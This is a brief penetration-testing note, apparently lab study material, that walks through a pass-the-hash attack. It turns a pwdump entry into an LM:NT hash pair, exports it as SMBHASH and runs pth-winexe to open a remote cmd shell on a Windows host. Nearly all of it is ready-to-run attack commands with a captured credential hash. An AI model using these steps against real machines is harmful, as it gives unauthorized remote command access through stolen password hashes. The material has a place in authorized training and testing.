Use of pth-winexe to get the shell

Suppose we have following pwdump entry:

pepa:500:NO PASSWORD*********************:F0077E09642828EF531A58C66A879462:::

Replace LM field with empty LM hash: AAD3B435B51404EEAAD3B435B51404EE

pepa:500:AAD3B435B51404EEAAD3B435B51404EE:F0077E09642828EF531A58C66A879462:::

Export hash to SMBHASH envar:

export SMBHASH=AAD3B435B51404EEAAD3B435B51404EE:F0077E09642828EF531A58C66A879462

Run pth-winexe:

pth-winexe -U offsec% //10.11.13.67 cmd
